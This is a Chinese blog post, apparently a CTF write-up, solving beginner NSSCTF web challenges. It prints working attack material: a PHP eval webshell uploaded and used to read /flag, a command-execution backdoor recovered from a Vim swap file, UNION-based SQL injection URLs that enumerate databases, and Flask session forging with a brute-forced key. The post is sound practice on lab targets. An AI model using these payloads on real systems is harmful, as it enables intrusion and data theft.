@@ -1,0 +1,324 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>web入门题单2 | tgrddf55's Blog</title><meta name="author" content="tgrddf55"><meta name="copyright" content="tgrddf55"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="链接NSSCTF web 题单 我Flag呢？查看源代码 就当无事发生考察的git commit  好像github页面没办法直接搜索，我git clone一下试试  git clone https:&#x2F;&#x2F;github.com&#x2F;ProbiusOfficial&#x2F;ProbiusOfficial.github.io.git  git log -S &#x27;LitCTF&#x27;  git show">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web入门题单2">
+<meta property="og:url" content="http://example.com/2025/06/08/2025-06-08-web%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%952/index.html">
+<meta property="og:site_name" content="tgrddf55&#39;s Blog">
+<meta property="og:description" content="链接NSSCTF web 题单 我Flag呢？查看源代码 就当无事发生考察的git commit  好像github页面没办法直接搜索，我git clone一下试试  git clone https:&#x2F;&#x2F;github.com&#x2F;ProbiusOfficial&#x2F;ProbiusOfficial.github.io.git  git log -S &#x27;LitCTF&#x27;  git show">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/49.jpg">
+<meta property="article:published_time" content="2025-06-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-06-07T16:00:00.000Z">
+<meta property="article:author" content="tgrddf55">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/49.jpg"><link rel="shortcut icon" href="/imgs/tgrddf55.jpg"><link rel="canonical" href="http://example.com/2025/06/08/2025-06-08-web%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%952/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'web入门题单2',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-06-08 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/imgs/tgrddf55.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/49.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="tgrddf55's Blog"><span class="site-name">tgrddf55's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">web入门题单2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-07T16:00:00.000Z" title="发表于 2025-06-08 00:00:00">2025-06-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-07T16:00:00.000Z" title="更新于 2025-06-08 00:00:00">2025-06-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="web入门题单2"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/sheet/14392">NSSCTF web 题单</a></p>
+<h1 id="我Flag呢？"><a href="#我Flag呢？" class="headerlink" title="我Flag呢？"></a>我Flag呢？</h1><p>查看源代码</p>
+<h1 id="就当无事发生"><a href="#就当无事发生" class="headerlink" title="就当无事发生"></a>就当无事发生</h1><p>考察的git commit </p>
+<p>好像github页面没办法直接搜索，我git clone一下试试 </p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ProbiusOfficial/ProbiusOfficial.github.io.git</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">log</span> -S <span class="string">&#x27;LitCTF&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git show  2d02084c5aa044d5dae3fc02a2a70248ab5500b5</span><br></pre></td></tr></table></figure>
+
+<p>第二条指令就是从commit中找到关于删除或增加指定字符串的commit</p>
+<p>第三条就是展示具体的commit内容</p>
+<h1 id="导弹迷踪"><a href="#导弹迷踪" class="headerlink" title="导弹迷踪"></a>导弹迷踪</h1><p>在F12中查找代码即可</p>
+<p>找到’mLevel’等于6时的结果即可</p>
+<h1 id="1zjs"><a href="#1zjs" class="headerlink" title="1zjs"></a>1zjs</h1><p>0.o?</p>
+<p>在index.umd.js里面搜索php，发现了<code> /f@k3f1ag.php</code> </p>
+<p>访问之后发现是brainfuck，然后在控制台输入就能得到flag（不知道为什么在线网站不行？）</p>
+<h1 id="Follow-me-and-hack-me"><a href="#Follow-me-and-hack-me" class="headerlink" title="Follow me and hack me"></a>Follow me and hack me</h1><p>讲get和post传参</p>
+<p>详见上一份题单</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -d <span class="string">&quot;Challenge=i&#x27;m_c0m1ng&quot;</span> http://node5.anna.nssctf.cn:23066/?CTF=Lit2023</span><br></pre></td></tr></table></figure>
+
+<h1 id="Vim-yyds"><a href="#Vim-yyds" class="headerlink" title="Vim yyds"></a>Vim yyds</h1><p>靠的是vim泄漏</p>
+<p>首先用dirsearch扫一下目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次意外退出产生的备份文件名为:.filename.swp</span><br><span class="line">第二次意外退出产生的备份文件名为:.filename.swo</span><br><span class="line">第三次意外退出产生的备份文件名为:.filename.swn</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">irsearch -u http://node4.anna.nssctf.cn:28589/</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3                                             </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                      </span><br><span class="line">                                                                             </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25</span><br><span class="line">Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/Desktop/reports/http_node4.anna.nssctf.cn_28589/__25-06-08_08-53-52.txt</span><br><span class="line"></span><br><span class="line">Target: http://node4.anna.nssctf.cn:28589/</span><br><span class="line"></span><br><span class="line">[08:53:52] Starting:                                                         </span><br><span class="line">[08:53:57] 403 -  288B  - /.ht_wsr.txt                                      </span><br><span class="line">[08:53:57] 403 -  288B  - /.htaccess.bak1                                   </span><br><span class="line">[08:53:57] 403 -  288B  - /.htaccess.sample                                 </span><br><span class="line">[08:53:57] 403 -  288B  - /.htaccessBAK</span><br><span class="line">[08:53:57] 403 -  288B  - /.htaccess.orig                                   </span><br><span class="line">[08:53:57] 403 -  288B  - /.htaccessOLD2</span><br><span class="line">[08:53:57] 403 -  288B  - /.htaccess_orig</span><br><span class="line">[08:53:57] 403 -  288B  - /.htaccess.save</span><br><span class="line">[08:53:57] 403 -  288B  - /.htaccess_sc                                     </span><br><span class="line">[08:53:57] 403 -  288B  - /.htaccess_extra                                  </span><br><span class="line">[08:53:57] 403 -  288B  - /.htm                                             </span><br><span class="line">[08:53:57] 403 -  288B  - /.htaccessOLD</span><br><span class="line">[08:53:57] 403 -  288B  - /.html</span><br><span class="line">[08:53:57] 403 -  288B  - /.htpasswd_test                                   </span><br><span class="line">[08:53:57] 403 -  288B  - /.htpasswds                                       </span><br><span class="line">[08:53:57] 403 -  288B  - /.httr-oauth                                      </span><br><span class="line">[08:53:57] 200 -   12KB - /.index.php.swp                                   </span><br><span class="line">[08:54:39] 403 -  288B  - /server-status                                    </span><br><span class="line">[08:54:39] 403 -  288B  - /server-status/                                   </span><br><span class="line"></span><br><span class="line">Task Completed     </span><br></pre></td></tr></table></figure>
+
+<p>能够发现有一个&#x2F;.index.php.swp   ，我们访问一下就能得到部分源码，看起来非常丑陋，不知道是我的问题还是本来就这样</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/body&gt;    &lt;/main&gt;        &lt;/div&gt;            ?&gt;            &#125;                eval(system($_POST[&#x27;cmd&#x27;]));                echo &quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;;            if ($_POST[&#x27;password&#x27;] === base64_encode($password)) &#123;            echo &quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;;            $password = &quot;Give_Me_Your_Flag&quot;;            error_reporting(0);            &lt;?php        &lt;div class=&quot;can_can_vim&quot;&gt;        &lt;/h3&gt;            队里师傅说Vim是世界上最好的编辑器，不接受反驳        &lt;h3 class=&quot;vim_said&quot;&gt;        &lt;/div&gt;            &lt;/h1&gt;                Vim yyds            &lt;h1 class=&quot;vim_yyds&quot;&gt;            &lt;img src=&quot;https://www.bing.com/th?id=OSAAS.7B95FA2D97CE022F5E7949F60E350A25&amp;pid=TechQna&quot;&gt;&lt;/img&gt;        &lt;div class=&quot;vim&quot;&gt;    &lt;main&gt;&lt;body&gt;&lt;/head&gt;    &lt;/style&gt;        &#125;            font-size: 20;        p &#123;        br,        &#125;            align-items: center;            justify-content: center;            display: flex;            color: #39c2ff;        h3.vim_said &#123;        &#125;            margin-left: 5px;            margin-top: 50;            justify-content: center;            align-items: flex-start;            display: flex;            color: #50f728;        h1.vim_yyds &#123;        &#125;            height: auto;            width: 8rem;            border: none;        img &#123;        &#125;            justify-content: center;            vertical-align: middle;            align-content: center;            display: flex;        div.vim &#123;        &#125;            justify-content: center;            align-items: center;            display: flex;        html &#123;        body,    &lt;style type=&quot;text/css&quot;&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;head&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提取关键点：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]));                <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;</span>;            <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$password</span>)) &#123;            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;</span>;            <span class="variable">$password</span> = <span class="string">&quot;Give_Me_Your_Flag&quot;</span>;  </span><br></pre></td></tr></table></figure>
+
+<p>大概就是password是base64编码的Give_Me_Your_Flag，然后执行cmd。</p>
+<p>可以使用hackbar进行访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="作业管理系统"><a href="#作业管理系统" class="headerlink" title="作业管理系统"></a>作业管理系统</h1><p>F12界面即可看到用户名和密码。</p>
+<p>之后我们可以上传文件</p>
+<p>上传一个一句话木马即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>之后我使用hackbar进行操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>即可得到flag</p>
+<h1 id="PHP是世界上最好的语言！！"><a href="#PHP是世界上最好的语言！！" class="headerlink" title="PHP是世界上最好的语言！！"></a>PHP是世界上最好的语言！！</h1><p>F12即可看到有任意代码执行</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#run&#x27;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">		php_code = $(<span class="string">&quot;#php_code&quot;</span>).<span class="title function_">val</span>().<span class="title function_">trim</span>() ;</span><br><span class="line">		<span class="keyword">if</span>(php_code != <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">			$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">				 <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">				 <span class="attr">url</span>: url,</span><br><span class="line">				 <span class="attr">data</span>: &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;run&quot;</span>,<span class="string">&quot;php_code&quot;</span>:php_code&#125;,</span><br><span class="line">				 <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">json</span>)&#123;</span><br><span class="line">						$(<span class="string">&quot;#run_result&quot;</span>).<span class="title function_">html</span>(json);</span><br><span class="line">					&#125;</span><br><span class="line">			 &#125;);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>我在网页上输入php代码不清楚为什么没办法执行(好像是当时存在网络问题没加载出来)，但是我们可以直接使用hackbar向do.php发送数据</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>=run&amp;php_code=&lt;?php system(<span class="string">&quot;cat /flag&quot;</span>); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功得到flag</p>
+<h1 id="这是什么？SQL-！注一下-！"><a href="#这是什么？SQL-！注一下-！" class="headerlink" title="这是什么？SQL ！注一下 ！"></a>这是什么？SQL ！注一下 ！</h1><p>开始学SQL注入了</p>
+<p>OK，先学一下SQL再说</p>
+<p>好吧，学完了还是没多少思路，只能得到username和password 不知道怎么出来flag</p>
+<p>我的注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1)))))) OR 1=1 --</span><br></pre></td></tr></table></figure>
+
+<p>首先想办法把前面的括号闭合掉，然后OR 1&#x3D;1 ，之后注释</p>
+<p>注意–后面有一个空格</p>
+<p>结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; Array ( [username] =&gt; tanji [password] =&gt; OHHHHHHH ) [1] =&gt; Array ( [username] =&gt; fake_flag [password] =&gt; F1rst_to_Th3_eggggggggg!&#125; (4/4) ) )</span><br></pre></td></tr></table></figure>
+
+<p>使用hackbar来进行sql注入</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:26645/?id=1%29%29%29%29%29%29+OR+1%3D1 union select 1,group_concat(schema_name) from information_schema.schemata +--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ((((((1)))))) OR 1=1 union select 1,group_concat(schema_name) from information_schema.schemata -- ))))))</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; Array ( [username] =&gt; tanji [password] =&gt; OHHHHHHH ) [1] =&gt; Array ( [username] =&gt; fake_flag [password] =&gt; F1rst_to_Th3_eggggggggg!&#125; (4/4) ) [2] =&gt; Array ( [username] =&gt; 1 [password] =&gt; information_schema,mysql,ctftraining,performance_schema,test,ctf ) )</span><br></pre></td></tr></table></figure>
+
+<p>最后的就是库名</p>
+<p>然后就是爆库的表名</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:23874/?id=1%29%29%29%29%29%29+OR+1%3D1 union select 1,group_concat(table_name,&quot;:&quot;,column_name) from information_schema.columns where table_schema=&#x27;ctftraining&#x27;+--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; Array ( [username] =&gt; tanji [password] =&gt; OHHHHHHH ) [1] =&gt; Array ( [username] =&gt; fake_flag [password] =&gt; F1rst_to_Th3_eggggggggg!&#125; (4/4) ) [2] =&gt; Array ( [username] =&gt; 1 [password] =&gt; flag:flag,news:id,news:title,news:content,news:time,users:id,users:username,users:password,users:ip,users:time ) )</span><br></pre></td></tr></table></figure>
+
+<p>可以看到出现了flag表flag列</p>
+<p>接下来就可以直接得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:23874/?id=1%29%29%29%29%29%29+OR+1%3D1 union select 1,flag from ctftraining.flag+--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; Array ( [username] =&gt; tanji [password] =&gt; OHHHHHHH ) [1] =&gt; Array ( [username] =&gt; fake_flag [password] =&gt; F1rst_to_Th3_eggggggggg!&#125; (4/4) ) [2] =&gt; Array ( [username] =&gt; 1 [password] =&gt; NSSCTF&#123;3a725d38-d60f-4fd0-a8f3-6cb059ee74ae&#125; ) )</span><br></pre></td></tr></table></figure>
+
+<h1 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h1><p>我最开始的想法：直接在elements修改check_ip函数，一直返回true，从而达到绕过验证的目的，验证一直失败。</p>
+<p>wp讲了四种方法。</p>
+<ol>
+<li>禁用javascript</li>
+<li>console中输入<code> check_ip=function()&#123;&#125;</code></li>
+<li>hackbar发包</li>
+<li>burpsuite抓包发包</li>
+</ol>
+<p>下面是gpt告诉我为什么我的不行，但是第二中方法行</p>
+<h2 id="为什么-check-ip-function-能生效？"><a href="#为什么-check-ip-function-能生效？" class="headerlink" title="为什么 check_ip = function(){} 能生效？"></a>为什么 <code>check_ip = function()&#123;&#125;</code> 能生效？</h2><p>这是因为你在 <strong>Console 中执行了全局变量重新赋值</strong>：</p>
+<ul>
+<li><code>check_ip = function()&#123;&#125;</code> 这条语句是在 <strong>全局作用域 window 对象上重新定义了一个新的函数</strong>。</li>
+<li>HTML 中 <code>&lt;form onsubmit=&quot;return check_ip()&quot;&gt;</code> 会在提交时从 <code>window.check_ip</code> 上取这个函数来执行。</li>
+</ul>
+<p>所以你等于是用一个“空函数”替换掉了原先定义的函数。只要这个函数没有 <code>return false</code>，表单就会默认提交。</p>
+<hr>
+<h2 id="❌-为什么你直接修改-中的-check-ip-函数体却没效果？"><a href="#❌-为什么你直接修改-中的-check-ip-函数体却没效果？" class="headerlink" title="❌ 为什么你直接修改 &lt;script&gt; 中的 check_ip() 函数体却没效果？"></a>❌ 为什么你直接修改 <code>&lt;script&gt;</code> 中的 <code>check_ip()</code> 函数体却没效果？</h2><p>如果你在 DevTools 的 <strong>Sources 面板</strong>中直接双击 <code>check_ip()</code> 所在的 <code>&lt;script&gt;</code> 内容去改（或者右键“Edit as HTML”改 <code>&lt;script&gt;</code> 标签），这不会生效的原因是：</p>
+<h3 id="📌-1-的-JS-是一次性执行的"><a href="#📌-1-的-JS-是一次性执行的" class="headerlink" title="📌 1. &lt;script&gt; 的 JS 是一次性执行的"></a>📌 1. <code>&lt;script&gt;</code> 的 JS 是一次性执行的</h3><ul>
+<li>页面加载时，浏览器会把 <code>&lt;script&gt;</code> 中的 JavaScript 执行一遍；</li>
+<li>然后<strong>就不会再执行或“重新解释”那段代码了</strong>；</li>
+<li>所以你在 Elements 里改 <code>&lt;script&gt;</code> 的内容，不会再次执行它，也不会更新函数。</li>
+</ul>
+<hr>
+<h3 id="📌-2-函数已经“绑定”到-form-的-onsubmit-上了"><a href="#📌-2-函数已经“绑定”到-form-的-onsubmit-上了" class="headerlink" title="📌 2. 函数已经“绑定”到 form 的 onsubmit 上了"></a>📌 2. 函数已经“绑定”到 form 的 onsubmit 上了</h3><ul>
+<li>在 <code>&lt;form onsubmit=&quot;return check_ip()&quot;&gt;</code> 中，浏览器其实会把这段 inline 代码翻译为一个函数，并与当前的 <code>check_ip</code> 函数绑定；</li>
+<li>如果你后来去改了 <code>check_ip()</code> 的函数体，但 <strong>onsubmit 事件仍然指向旧的版本（不是你修改后的）</strong>；</li>
+<li>所以你看到“改了函数体，但结果不变”的情况。</li>
+</ul>
+<hr>
+<h2 id="✅-为什么重新赋值-check-ip-function-就能生效？"><a href="#✅-为什么重新赋值-check-ip-function-就能生效？" class="headerlink" title="✅ 为什么重新赋值 check_ip = function(){} 就能生效？"></a>✅ 为什么重新赋值 <code>check_ip = function()&#123;&#125;</code> 就能生效？</h2><p>因为这是 <strong>直接把全局的 <code>check_ip</code> 指针指向了一个新函数</strong>，而 <code>onsubmit</code> 在触发时会去读取 <code>window.check_ip()</code>，于是就执行了你新定义的空函数。</p>
+<p>大概意思是说，最开始的时候check_ip就已经绑定上onsubmmit了，之后我怎么修改都没用，绑定的还是老的check_ip，但是console上我是把全局变量改掉了，因此能成功。</p>
+<h1 id="Flag-点击就送！"><a href="#Flag-点击就送！" class="headerlink" title="Flag 点击就送！"></a>Flag 点击就送！</h1><p>好像涉及到过多知识了,未来再搞，简单学学</p>
+<p>大概了解了一下，是session伪造</p>
+<p>session是什么？</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">因为 HTTP 是无状态协议，每次请求都是独立的。举个例子：</span><br><span class="line">你登录了一个网站。</span><br><span class="line">接下来你点进“个人中心”页面，服务器还怎么知道是你?</span><br><span class="line">这就需要一种机制让服务器记住你。Session 就是这种机制之一。</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>说明</th>
+<th>Cookie</th>
+<th>Session</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>存储位置</td>
+<td>浏览器（客户端）</td>
+<td>服务器端</td>
+</tr>
+<tr>
+<td>安全性</td>
+<td>容易被伪造</td>
+<td>更安全（不暴露数据）</td>
+</tr>
+<tr>
+<td>存储数据</td>
+<td>只能存字符串</td>
+<td>可以存各种结构数据</td>
+</tr>
+<tr>
+<td>控制方式</td>
+<td>前端控制</td>
+<td>后端控制（配合 Cookie 识别）</td>
+</tr>
+</tbody></table>
+<p>还是分不太清楚session和cookie的区别</p>
+<p>反正session也是服务器用来标识客户的方式。</p>
+<p>这个题里session内容就在cookie里面</p>
+<p>抓包可以看到cookie里面有下面的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hm_lvt_648a44a949074de73151ffaa0a832aec=1744343990,1744360141,1744448784,1744616660; session=eyJuYW1lIjoidGdyZGRmNTUifQ.aEwKUg.7P8yTPtTB0egjrtiCJngK5tV44E</span><br></pre></td></tr></table></figure>
+
+<p>其中刚好有session的内容，其中前三分之一的部分是base64，后面内容的部分是签名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJuYW1lIjoidGdyZGRmNTUifQ</span><br><span class="line">&#123;&quot;name&quot;:&quot;tgrddf55&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的就是下面数据的base64</p>
+<p>然后这个用的是flask框架</p>
+<p>flask是什么？</p>
+<p>Flask 是一个用 <strong>Python 编写的轻量级 Web 框架</strong>，让你可以快速构建网页或 API 应用。简单来说，它是一个工具包，让你用 Python 写出一个可以在浏览器中访问的网站或后台服务。</p>
+<p>flask设置session需要一个密钥，这个密钥可以爆破出来，不过需要有一个包含该密钥的字典</p>
+<p>最后爆出来密钥是’LitCTF’</p>
+<p>之后使用该密钥对</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;admin&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行加密，然后发包即可</p>
